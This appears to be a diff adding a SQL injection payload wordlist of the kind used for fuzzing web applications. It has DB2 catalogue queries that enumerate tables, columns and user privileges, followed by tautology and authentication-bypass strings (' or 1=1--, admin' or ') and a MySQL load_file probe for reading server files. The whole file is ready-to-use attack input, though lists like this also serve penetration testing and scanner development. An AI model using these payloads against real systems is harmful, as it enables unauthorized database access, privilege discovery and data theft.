@@ -1,0 +1,20 @@
+select current server from sysibm.sysdummy1;
+select name from sysibm.systables;
+select grantee from syscat.dbauth;
+select * from syscat.tabauth;
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth where grantee = current user;
+select name, tbname, coltype from sysibm.syscolumns;
+a'
+admin' or '
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+' and 1 in (select var from temp)--
+anything' OR 'x'='x
+"a"" or 1=1--"
+a' or 1=1--
+"a"" or 3=3--"
+a' or 3=3--
+a' or 'a' = 'a
+&apos;%20OR
+as
+asc
